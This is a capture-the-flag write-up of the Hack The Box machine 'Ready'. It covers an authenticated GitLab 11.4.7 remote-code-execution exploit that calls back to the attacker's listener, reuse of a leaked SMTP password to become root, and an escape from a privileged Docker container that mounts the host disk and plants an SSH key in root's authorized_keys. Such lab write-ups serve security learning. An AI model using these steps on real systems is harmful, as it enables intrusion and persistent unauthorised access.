Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.

## Gitlab

The webserver on port 5080 runs a Gitlab instance.

![](/assets/images/htb-writeup-ready/gitlab1.png)

We have access to create a new account.

![](/assets/images/htb-writeup-ready/gitlab2.png)

Once logged in, we see in the projects list there's a single projet called *ready-channel*.

![](/assets/images/htb-writeup-ready/gitlab3.png)

To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.

![](/assets/images/htb-writeup-ready/gitlab5.png)

A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.

`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`

## Privesc

By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 

```
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

That password is the same password as the root password for the container so we can privesc locally inside the container.

```
git@gitlab:/opt/backup$ su -l root
su -l root
Password: wW59U!ZKMbG9+*#h

root@gitlab:~# 
```

There's a root_pass file in the root of the filesystem but that's not useful.

```
cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:

```
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m
```

Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.

To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.

```
root@gitlab:~# mount /dev/sda2 /mnt
mount /dev/sda2 /mnt
root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys
